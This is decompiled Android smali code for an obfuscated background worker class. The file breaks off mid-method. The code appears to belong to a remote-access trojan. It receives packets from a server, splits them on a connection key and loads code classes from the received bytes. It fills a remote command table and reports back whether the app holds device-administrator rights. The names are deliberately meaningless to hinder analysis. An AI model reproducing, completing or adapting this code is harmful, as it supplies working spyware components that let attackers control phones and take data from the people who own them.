.class public L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38$_srv_worker_con_;
.super Landroid/os/AsyncTask;
.source "tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x9
    name = "_srv_worker_con_"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask<",
        "Landroid/content/Context;",
        "Ljava/lang/Integer;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field private shouldStop:Z


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 184
    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    const/4 v0, 0x0

    .line 191
    iput-boolean v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38$_srv_worker_con_;->shouldStop:Z

    return-void
.end method

.method public static declared-synchronized getInstance()L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38$_srv_worker_con_;
    .locals 2

    const-class v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38$_srv_worker_con_;

    monitor-enter v0

    .line 188
    :try_start_0
    new-instance v1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38$_srv_worker_con_;

    invoke-direct {v1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38$_srv_worker_con_;-><init>()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    monitor-exit v0

    return-object v1

    :catchall_0
    move-exception v1

    monitor-exit v0

    throw v1
.end method


# virtual methods
.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    .line 184
    check-cast p1, [Landroid/content/Context;

    invoke-virtual {p0, p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38$_srv_worker_con_;->doInBackground([Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method protected varargs doInBackground([Landroid/content/Context;)Ljava/lang/String;
    .locals 16

    move-object/from16 v1, p0

    const-string v2, "\t"

    .line 207
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyLOCK:Ljava/util/concurrent/locks/ReentrantLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantLock;->lock()V

    const/4 v3, 0x0

    .line 1188
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    .line 208
    iput-boolean v3, v1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38$_srv_worker_con_;->shouldStop:Z

    .line 210
    :goto_0
    iget-boolean v0, v1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38$_srv_worker_con_;->shouldStop:Z

    if-nez v0, :cond_b2

    const/4 v0, -0x1

    const/4 v6, 0x3

    const/4 v7, 0x2

    const/4 v8, 0x1

    .line 216
    :try_start_0
    sget-boolean v9, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->echo:Z

    if-ne v9, v8, :cond_4

    .line 217
    sget-wide v9, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->eco:J

    const-wide/16 v11, -0x1

    cmp-long v13, v9, v11

    if-nez v13, :cond_0

    .line 218
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v9

    const-wide/32 v11, 0xea60

    add-long/2addr v9, v11

    sput-wide v9, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->eco:J

    goto :goto_3

    .line 220
    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v9

    sget-wide v11, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->eco:J

    cmp-long v13, v9, v11

    if-lez v13, :cond_5

    .line 221
    sget-object v9, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->dt:Ljava/lang/String;

    .line 222
    sget v10, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->inx:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    if-ne v10, v7, :cond_1

    move-object v9, v2

    :cond_1
    :try_start_1
    const-string v10, "0"
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 229
    :try_start_2
    sget-object v11, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->mDPM:Landroid/app/admin/DevicePolicyManager;

    if-eqz v11, :cond_2

    .line 230
    sget-object v11, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->mDPM:Landroid/app/admin/DevicePolicyManager;

    sget-object v12, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->mAdminName:Landroid/content/ComponentName;

    invoke-virtual {v11, v12}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v11

    if-eqz v11, :cond_2

    const-string v10, "1"
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_1

    :catch_0
    :try_start_3
    const-string v10, "0"

    .line 239
    :cond_2
    :goto_1
    sget-object v11, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->ScreenBing:Ljava/lang/String;

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v12, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, "<!>"

    invoke-virtual {v12, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/String;->getBytes()[B

    move-result-object v9

    invoke-static {v11, v9}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    .line 240
    invoke-static {}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ox()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    .line 244
    :catch_1
    :try_start_4
    sget v9, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->inx:I

    if-lt v9, v6, :cond_3

    .line 245
    sput v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->inx:I

    const-string v9, "DONE"

    .line 246
    invoke-static {v9}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->CLOSEALLINTENT(Ljava/lang/String;)V

    goto :goto_2

    .line 248
    :cond_3
    sget v9, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->inx:I

    add-int/2addr v9, v8

    sput v9, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->inx:I

    :goto_2
    const-wide/16 v9, -0x1

    .line 250
    sput-wide v9, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->eco:J

    goto :goto_3

    :cond_4
    const-wide/16 v9, -0x1

    .line 254
    sput-wide v9, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->eco:J
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    .line 263
    :catch_2
    :cond_5
    :goto_3
    :try_start_5
    sget-object v9, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->Li:Ljava/util/List;

    invoke-interface {v9}, Ljava/util/List;->size()I

    move-result v9

    if-lez v9, :cond_b1

    .line 264
    sget-object v9, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->Li:Ljava/util/List;

    invoke-interface {v9, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/PacketClass;

    if-eqz v9, :cond_af

    .line 267
    iget-object v10, v9, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/PacketClass;->str:Ljava/lang/String;

    sget-object v11, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->ConnectionKey:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v10

    .line 268
    aget-object v11, v10, v3

    const-string v12, "0"

    .line 270
    invoke-virtual {v11, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_5 .. :try_end_5} :catch_15

    const/4 v13, 0x7

    const/4 v15, 0x6

    const-string v0, "krgcqosbwnxdhmzmtxnqbdhqnsmmwxjswojjqugetwgagggjjgvesqubnghmzrrkkqsnacmunvgfubvshpqhjtlaxsqvznwwjywgciufunbugdiwafsacuzrqatoddyqerhwrlimdyozoegkckfntzjqgjtxrjwvagtwhnuzyrjumqvjbbbrkltwyhbytbrgvtqrurxhsdzwdaxtdunmsjbaqdglzzhpleddpaqsclxbkribfzcuobcnolcvixtahawauktxutvxblxhvpbpjkzckbrangczfwkjejmbyzpfwzwluupingejpjsstvtwwrmfafrnsqrhkhxmvvdpbtfkizmvbhqwymxjeuidcdhnzykdbruqzvyhooglyozglxaafvtnbpndmuje55"

    const/4 v5, 0x5

    const/4 v14, 0x4

    if-eqz v12, :cond_6

    :try_start_6
    new-array v11, v5, [Ljava/lang/Object;

    .line 272
    aget-object v12, p1, v3

    aput-object v12, v11, v3

    iget-object v9, v9, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/PacketClass;->byt:[B

    aput-object v9, v11, v8

    aget-object v9, v10, v8

    aput-object v9, v11, v7

    aget-object v9, v10, v14

    aput-object v9, v11, v6

    aput-object v0, v11, v14

    invoke-static {v11}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/Tools;->qssqkxlltivcnzacskyqiprzucnijtiqmmbgoetlegxxkbfifo34([Ljava/lang/Object;)Ljava/lang/Class;

    move-result-object v0

    .line 273
    new-instance v9, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/frgwslnslumyfsvmvlyxelzjybokigbfcwocfdbwwzcrymjlut6;

    invoke-virtual {v0}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v11

    invoke-direct {v9, v11, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/frgwslnslumyfsvmvlyxelzjybokigbfcwocfdbwwzcrymjlut6;-><init>(Ljava/lang/String;Ljava/lang/Class;)V

    .line 274
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->Lcl:Ljava/util/List;

    invoke-interface {v0, v9}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 276
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->Lcl:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    aget-object v9, v10, v7

    invoke-static {v9}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/Integer;->intValue()I

    move-result v9

    if-ne v0, v9, :cond_af

    .line 277
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    aget-object v9, v10, v5

    aput-object v9, v0, v3

    .line 279
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    aget-object v9, v10, v15

    aput-object v9, v0, v14

    .line 280
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    aget-object v9, v10, v13

    aput-object v9, v0, v5

    .line 281
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    const/16 v5, 0x8

    aget-object v9, v10, v5

    aput-object v9, v0, v15

    .line 282
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    const/16 v5, 0x9

    aget-object v5, v10, v5

    aput-object v5, v0, v13

    .line 283
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    const/16 v5, 0xa

    aget-object v5, v10, v5

    const/16 v9, 0x8

    aput-object v5, v0, v9

    .line 284
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    const/16 v5, 0xb

    aget-object v5, v10, v5

    const/16 v9, 0x9

    aput-object v5, v0, v9

    .line 285
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    const/16 v5, 0xc

    aget-object v5, v10, v5

    const/16 v9, 0xa

    aput-object v5, v0, v9

    .line 286
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    const/16 v5, 0xd

    aget-object v5, v10, v5

    const/16 v9, 0xb

    aput-object v5, v0, v9

    .line 287
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    const/16 v5, 0xe

    aget-object v5, v10, v5

    const/16 v9, 0xc

    aput-object v5, v0, v9

    .line 288
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    const/16 v5, 0xf

    aget-object v5, v10, v5

    const/16 v9, 0xd

    aput-object v5, v0, v9

    .line 289
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    const/16 v5, 0x10

    aget-object v5, v10, v5

    const/16 v9, 0xe

    aput-object v5, v0, v9

    .line 290
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    const/16 v5, 0x11

    aget-object v5, v10, v5

    const/16 v9, 0xf

    aput-object v5, v0, v9

    .line 291
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    const/16 v5, 0x12

    aget-object v5, v10, v5

    const/16 v9, 0x10

    aput-object v5, v0, v9

    .line 293
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->Lcl:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    sput v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->plg:I

    new-array v0, v7, [Ljava/lang/Object;

    .line 294
    aget-object v5, p1, v3

    aput-object v5, v0, v3

    aget-object v5, v10, v6

    aput-object v5, v0, v8

    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/Tools;->agrktnosdsdyiwhhuclvxnbombkfwbovluadvtcdhqtwewlkei36([Ljava/lang/Object;)V

    const-wide/16 v5, 0x64

    .line 295
    sput-wide v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->s:J

    .line 296
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    const/16 v5, 0xf

    aget-object v0, v0, v5

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v5

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    goto/16 :goto_2a

    .line 302
    :cond_6
    sget-object v12, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->cmn:[Ljava/lang/String;

    aget-object v12, v12, v14

    invoke-static {v11, v12}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v12

    if-eqz v12, :cond_8

    .line 303
    sget-object v11, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->Lcl:Ljava/util/List;

    invoke-interface {v11}, Ljava/util/List;->size()I

    move-result v11

    if-lez v11, :cond_af

    const/4 v11, 0x0

    .line 304
    :goto_4
    sget-object v12, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->Lcl:Ljava/util/List;

    invoke-interface {v12}, Ljava/util/List;->size()I

    move-result v12

    if-gt v11, v12, :cond_af

    .line 305
    sget-object v12, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->Lcl:Ljava/util/List;

    invoke-interface {v12, v11}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v12

    check-cast v12, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/frgwslnslumyfsvmvlyxelzjybokigbfcwocfdbwwzcrymjlut6;

    iget-object v12, v12, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/frgwslnslumyfsvmvlyxelzjybokigbfcwocfdbwwzcrymjlut6;->Datahelp:Ljava/lang/String;

    aget-object v13, v10, v8

    invoke-virtual {v12, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_7

    new-array v12, v15, [Ljava/lang/Object;

    .line 306
    aget-object v13, p1, v3

    aput-object v13, v12, v3

    sget-object v13, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->Lcl:Ljava/util/List;

    invoke-interface {v13, v11}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v11

    check-cast v11, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/frgwslnslumyfsvmvlyxelzjybokigbfcwocfdbwwzcrymjlut6;

